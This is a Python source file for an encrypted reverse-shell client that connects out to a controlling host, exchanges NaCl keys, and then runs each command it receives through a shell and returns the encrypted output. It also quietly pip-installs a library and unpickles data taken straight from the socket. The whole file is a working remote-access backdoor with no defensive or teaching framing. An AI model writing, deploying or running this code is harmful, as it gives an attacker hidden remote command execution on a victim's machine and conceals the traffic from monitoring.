from os import getcwd
from pickle import dumps, loads
from socket import socket
from subprocess import Popen, PIPE
from time import sleep


class Client:
    def __init__(self):
        self.target_host = '127.0.0.1'
        self.target_port = 5555
        self.buffer = 1024*1000
        self.socket = None
        self.private_key = PrivateKey.generate()
        self.public_key = self.private_key.public_key
        self.host_public_key = None
        self.box = None


    def connect(self):
        self.socket = socket()
        self.socket.connect((self.target_host, self.target_port))
        self.public_key_exchange()
        cwd = getcwd()
        self.socket.send(dumps(self.box.encrypt(cwd.encode())))
        while True:
            command = self.socket.recv(self.buffer)
            command = self.box.decrypt(loads(command)).decode()
            if command == 'exit':
                break
            cwd = getcwd()
            output = Popen(command, shell=True,
                                      stdout=PIPE,
                                      stderr=PIPE,
                                      stdin=PIPE)
            message = str((output.stdout.read() + output.stderr.read()), 'utf-8') + '\n' + cwd + ' > '
            self.socket.send(dumps(self.box.encrypt(message.encode())))
        self.socket.close()


    def public_key_exchange(self):
        self.socket.send(dumps(self.public_key))
        self.host_public_key = loads(self.socket.recv(self.buffer))
        self.box = Box(self.private_key, self.host_public_key)


def main():
    client = Client()
    client.connect()


if __name__ == '__main__':
        #if python is not installed, script needs possibility of not using encryption
        try:
            from nacl.public import PrivateKey, Box
        except:
            Popen('pip install pynacl --quiet', shell=True)
            sleep(5)
            from nacl.public import PrivateKey, Box
        main()

